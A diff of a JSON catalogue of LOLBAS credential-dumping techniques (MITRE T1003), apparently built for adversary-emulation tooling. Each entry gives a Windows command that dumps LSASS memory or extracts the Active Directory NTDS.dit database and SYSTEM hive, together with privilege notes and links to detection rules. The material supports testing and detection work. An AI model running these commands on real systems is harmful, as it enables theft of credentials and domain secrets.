+        "source_id": "lolbas:yml/OtherMSBinaries/Dump64.yml:0:0",
+        "source_tcodes": [
+          "T1003.001"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Required source privilege: Administrator."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/DumpMinitool.yml:0:0",
+      "name": "LOLBAS - T1003.001 - DumpMinitool.exe - Dump - Create memory dump and parse it offline [875f722]",
+      "description": "Dump tool part Visual Studio 2022. Creates a memory dump of the lsass process Use case: Create memory dump and parse it offline. Privilege: Administrator.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.001",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "DumpMinitool.exe --file #{lotl_lolbas_local_path} --processId 1132 --dumpType Full",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/DumpMinitool.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/DumpMinitool.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "DumpMinitool.exe",
+        "command_index": 0,
+        "category": "Dump",
+        "usecase": "Create memory dump and parse it offline",
+        "privileges": "Administrator",
+        "operating_system": "Windows 10, Windows 11",
+        "source_mitre_id": "T1003.001",
+        "full_paths": [
+          "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\Extensions\\TestPlatform\\Extensions\\DumpMinitool.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/mrd0x/status/1511415432888131586"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_dumpminitool_execution.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_dumpminitool_susp_execution.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_devinit_lolbin_usage.yml"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/DumpMinitool.yml:0:0",
+        "source_tcodes": [
+          "T1003.001"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Required source privilege: Administrator."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Ntdsutil.yml:0:0",
+      "name": "LOLBAS - T1003.003 - ntdsutil.exe - Dump - Dumping of Active Directory NTDS.dit database [811f1e5]",
+      "description": "Command line utility used to export Active Directory.. Dump NTDS.dit into folder Use case: Dumping of Active Directory NTDS.dit database. Privilege: Administrator.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.003",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\\" q q",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Ntdsutil.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Ntdsutil.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "ntdsutil.exe",
+        "command_index": 0,
+        "category": "Dump",
+        "usecase": "Dumping of Active Directory NTDS.dit database",
+        "privileges": "Administrator",
+        "operating_system": "Windows",
+        "source_mitre_id": "T1003.003",
+        "full_paths": [
+          "C:\\Windows\\System32\\ntdsutil.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://adsecurity.org/?p=2398#CreateIFM"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_ntdsutil_usage.yml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/2b87b26bdc2a84b65b1355ffbd5174bdbdb1879c/detections/endpoint/ntdsutil_export_ntds.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml"
+          },
+          {
+            "IOC": "ntdsutil.exe with command line including \"ifm\""
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Ntdsutil.yml:0:0",
+        "source_tcodes": [
+          "T1003.003"
+        ],
+        "context": "all",
+        "readiness": "ready",
+        "prerequisites": [
+          "Required source privilege: Administrator."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Rdrleakdiag.yml:0:2",
+      "name": "LOLBAS - T1003.001 - rdrleakdiag.exe - Dump - Dump LSASS process mutliple times. [df80ae6]",
+      "description": "Microsoft Windows resource leak diagnostic tool. After dumping a process using `/wait 1`, subsequent dumps must use `/snap` (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`). Use case: Dump LSASS process mutliple times.. Privilege: Administrator.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.001",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "rdrleakdiag.exe /p 832 /o #{lotl_lolbas_local_path} /fullmemdmp /snap",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Rdrleakdiag.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rdrleakdiag.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "rdrleakdiag.exe",
+        "command_index": 2,
+        "category": "Dump",
+        "usecase": "Dump LSASS process mutliple times.",
+        "privileges": "Administrator",
+        "operating_system": "Windows",
+        "source_mitre_id": "T1003.001",
+        "full_paths": [
+          "c:\\windows\\system32\\rdrleakdiag.exe",
+          "c:\\Windows\\SysWOW64\\rdrleakdiag.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/0gtweet/status/1299071304805560321?s=21",
+          "https://www.pureid.io/dumping-abusing-windows-credentials-part-1/",
+          "https://github.com/LOLBAS-Project/LOLBAS/issues/84"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_rdrleakdiag_process_dumping.yml"
+          },
+          {
+            "Elastic": "https://www.elastic.co/guide/en/security/current/potential-credential-access-via-windows-utilities.html"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Rdrleakdiag.yml:0:2",
+        "source_tcodes": [
+          "T1003.001"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Required source privilege: Administrator."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Rdrleakdiag.yml:0:1",
+      "name": "LOLBAS - T1003.001 - rdrleakdiag.exe - Dump - Dump LSASS process. [a199d88]",
+      "description": "Microsoft Windows resource leak diagnostic tool. Dump LSASS process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`). Use case: Dump LSASS process.. Privilege: Administrator.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.001",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "rdrleakdiag.exe /p 832 /o #{lotl_lolbas_local_path} /fullmemdmp /wait 1",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Rdrleakdiag.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rdrleakdiag.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "rdrleakdiag.exe",
+        "command_index": 1,
+        "category": "Dump",
+        "usecase": "Dump LSASS process.",
+        "privileges": "Administrator",
+        "operating_system": "Windows",
+        "source_mitre_id": "T1003.001",
+        "full_paths": [
+          "c:\\windows\\system32\\rdrleakdiag.exe",
+          "c:\\Windows\\SysWOW64\\rdrleakdiag.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/0gtweet/status/1299071304805560321?s=21",
+          "https://www.pureid.io/dumping-abusing-windows-credentials-part-1/",
+          "https://github.com/LOLBAS-Project/LOLBAS/issues/84"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_rdrleakdiag_process_dumping.yml"
+          },
+          {
+            "Elastic": "https://www.elastic.co/guide/en/security/current/potential-credential-access-via-windows-utilities.html"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Rdrleakdiag.yml:0:1",
+        "source_tcodes": [
+          "T1003.001"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Required source privilege: Administrator."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Rdrleakdiag.yml:0:0",
+      "name": "LOLBAS - T1003 - rdrleakdiag.exe - Dump - Dump process by PID. [f9e715e]",
+      "description": "Microsoft Windows resource leak diagnostic tool. Dump process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`). Use case: Dump process by PID.. Privilege: User.",
+      "tactic": "Credential Access",
+      "tcode": "T1003",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "rdrleakdiag.exe /p 940 /o #{lotl_lolbas_local_path} /fullmemdmp /wait 1",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Rdrleakdiag.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rdrleakdiag.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "rdrleakdiag.exe",
+        "command_index": 0,
+        "category": "Dump",
+        "usecase": "Dump process by PID.",
+        "privileges": "User",
+        "operating_system": "Windows",
+        "source_mitre_id": "T1003",
+        "full_paths": [
+          "c:\\windows\\system32\\rdrleakdiag.exe",
+          "c:\\Windows\\SysWOW64\\rdrleakdiag.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/0gtweet/status/1299071304805560321?s=21",
+          "https://www.pureid.io/dumping-abusing-windows-credentials-part-1/",
+          "https://github.com/LOLBAS-Project/LOLBAS/issues/84"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_rdrleakdiag_process_dumping.yml"
+          },
+          {
+            "Elastic": "https://www.elastic.co/guide/en/security/current/potential-credential-access-via-windows-utilities.html"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Rdrleakdiag.yml:0:0",
+        "source_tcodes": [
+          "T1003"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Sqldumper.yml:0:0",
+      "name": "LOLBAS - T1003 - Sqldumper.exe - Dump - Dump process using PID. [72fe52b]",
+      "description": "Debugging utility included with Microsoft SQL.. Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp). Use case: Dump process using PID.. Privilege: Administrator.",
+      "tactic": "Credential Access",
+      "tcode": "T1003",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "sqldumper.exe 464 0 0x0110",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Sqldumper.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Sqldumper.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Sqldumper.exe",
+        "command_index": 0,
+        "category": "Dump",
+        "usecase": "Dump process using PID.",
+        "privileges": "Administrator",
+        "operating_system": "Windows",
+        "source_mitre_id": "T1003",
+        "full_paths": [
+          "C:\\Program Files\\Microsoft SQL Server\\90\\Shared\\SQLDumper.exe",
+          "C:\\Program Files (x86)\\Microsoft Office\\root\\vfs\\ProgramFilesX86\\Microsoft Analysis\\AS OLEDB\\140\\SQLDumper.exe",
+          "C:\\Program Files\\Microsoft Power BI Desktop\\bin\\SqlDumper.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/countuponsec/status/910969424215232518",
+          "https://twitter.com/countuponsec/status/910977826853068800",
+          "https://support.microsoft.com/en-us/help/917825/how-to-use-the-sqldumper-exe-utility-to-generate-a-dump-file-in-sql-se"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_susp_sqldumper_activity.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/f6421d8c534f295518a2c945f530e8afc4c8ad1b/rules/windows/credential_access_lsass_memdump_file_created.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Sqldumper.yml:0:0",
+        "source_tcodes": [
+          "T1003"
+        ],
+        "context": "all",
+        "readiness": "ready",
+        "prerequisites": [
+          "Required source privilege: Administrator."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Sqldumper.yml:0:1",
+      "name": "LOLBAS - T1003.001 - Sqldumper.exe - Dump - Dump LSASS.exe to Mimikatz compatible dump using PID. [fa23448]",
+      "description": "Debugging utility included with Microsoft SQL.. 0x01100:40 flag will create a Mimikatz compatible dump file. Use case: Dump LSASS.exe to Mimikatz compatible dump using PID.. Privilege: Administrator.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.001",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "sqldumper.exe 540 0 0x01100:40",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Sqldumper.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Sqldumper.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Sqldumper.exe",
+        "command_index": 1,
+        "category": "Dump",
+        "usecase": "Dump LSASS.exe to Mimikatz compatible dump using PID.",
+        "privileges": "Administrator",
+        "operating_system": "Windows",
+        "source_mitre_id": "T1003.001",
+        "full_paths": [
+          "C:\\Program Files\\Microsoft SQL Server\\90\\Shared\\SQLDumper.exe",
+          "C:\\Program Files (x86)\\Microsoft Office\\root\\vfs\\ProgramFilesX86\\Microsoft Analysis\\AS OLEDB\\140\\SQLDumper.exe",
+          "C:\\Program Files\\Microsoft Power BI Desktop\\bin\\SqlDumper.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/countuponsec/status/910969424215232518",
+          "https://twitter.com/countuponsec/status/910977826853068800",
+          "https://support.microsoft.com/en-us/help/917825/how-to-use-the-sqldumper-exe-utility-to-generate-a-dump-file-in-sql-se"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_susp_sqldumper_activity.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/f6421d8c534f295518a2c945f530e8afc4c8ad1b/rules/windows/credential_access_lsass_memdump_file_created.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Sqldumper.yml:0:1",
+        "source_tcodes": [
+          "T1003.001"
+        ],
+        "context": "all",
+        "readiness": "ready",
+        "prerequisites": [
+          "Required source privilege: Administrator."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Tttracer.yml:0:1",
+      "name": "LOLBAS - T1003 - Tttracer.exe - Dump - Dump process by PID [91e2551]",
+      "description": "Used by Windows 1809 and newer to Debug Time Travel. Dumps process using tttracer.exe. Requires administrator privileges Use case: Dump process by PID. Privilege: Administrator.",
+      "tactic": "Credential Access",
+      "tcode": "T1003",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "TTTracer.exe -dumpFull -attach #{lotl_lolbas_argument}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_argument"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Tttracer.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Tttracer.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "Tttracer.exe",
+        "command_index": 1,
+        "category": "Dump",
+        "usecase": "Dump process by PID",
+        "privileges": "Administrator",
+        "operating_system": "Windows 10 1809 and newer, Windows 11",
+        "source_mitre_id": "T1003",
+        "full_paths": [
+          "C:\\Windows\\System32\\tttracer.exe",
+          "C:\\Windows\\SysWOW64\\tttracer.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/oulusoyum/status/1191329746069655553",
+          "https://twitter.com/mattifestation/status/1196390321783025666",
+          "https://lists.samba.org/archive/cifs-protocol/2016-April/002877.html"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_tttracer_mod_load.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/image_load/image_load_tttracer_mod_load.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml"
+          },
+          {
+            "IOC": "Parent child relationship. Tttracer parent for executed command"
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Tttracer.yml:0:1",
+        "source_tcodes": [
+          "T1003"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Required source privilege: Administrator."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Wbadmin.yml:0:0",
+      "name": "LOLBAS - T1003.003 - wbadmin.exe - Dump - Snapshoting of Active Directory NTDS.dit database [1528a22]",
+      "description": "Windows Backup Administration utility. Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx) Use case: Snapshoting of Active Directory NTDS.dit database. Privilege: Administrator, Backup Operators, SeBackupPrivilege.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.003",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "wbadmin start backup -backupTarget:#{lotl_lolbas_local_path} -include:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -quiet",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Wbadmin.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wbadmin.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "wbadmin.exe",
+        "command_index": 0,
+        "category": "Dump",
+        "usecase": "Snapshoting of Active Directory NTDS.dit database",
+        "privileges": "Administrator, Backup Operators, SeBackupPrivilege",
+        "operating_system": "Windows Server",
+        "source_mitre_id": "T1003.003",
+        "full_paths": [
+          "C:\\Windows\\System32\\wbadmin.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_dump_sensitive_files.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_file.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_sensitive_files.yml"
+          },
+          {
+            "IOC": "wbadmin.exe command lines containing \"NTDS\" or \"NTDS.dit\""
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Wbadmin.yml:0:0",
+        "source_tcodes": [
+          "T1003.003"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Required source privilege: Administrator, Backup Operators, SeBackupPrivilege."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Wbadmin.yml:0:1",
+      "name": "LOLBAS - T1003.003 - wbadmin.exe - Dump - Dumping of Active Directory NTDS.dit database [b2e7a96]",
+      "description": "Windows Backup Administration utility. Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers. Use case: Dumping of Active Directory NTDS.dit database. Privilege: Administrator, Backup Operators, SeBackupPrivilege.",
+      "tactic": "Credential Access",
+      "tcode": "T1003.003",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:#{lotl_lolbas_local_path} -itemtype:file -items:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -notRestoreAcl -quiet",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Wbadmin.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wbadmin.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "wbadmin.exe",
+        "command_index": 1,
+        "category": "Dump",
+        "usecase": "Dumping of Active Directory NTDS.dit database",
+        "privileges": "Administrator, Backup Operators, SeBackupPrivilege",
+        "operating_system": "Windows Server",
+        "source_mitre_id": "T1003.003",
+        "full_paths": [
+          "C:\\Windows\\System32\\wbadmin.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_dump_sensitive_files.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_file.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_sensitive_files.yml"
+          },
+          {
+            "IOC": "wbadmin.exe command lines containing \"NTDS\" or \"NTDS.dit\""
+          }
+        ],
+        "tags": [],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Wbadmin.yml:0:1",
+        "source_tcodes": [
+          "T1003.003"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Required source privilege: Administrator, Backup Operators, SeBackupPrivilege."
+        ]
+      }
+    }
+  ],
+  "chains": []
+}
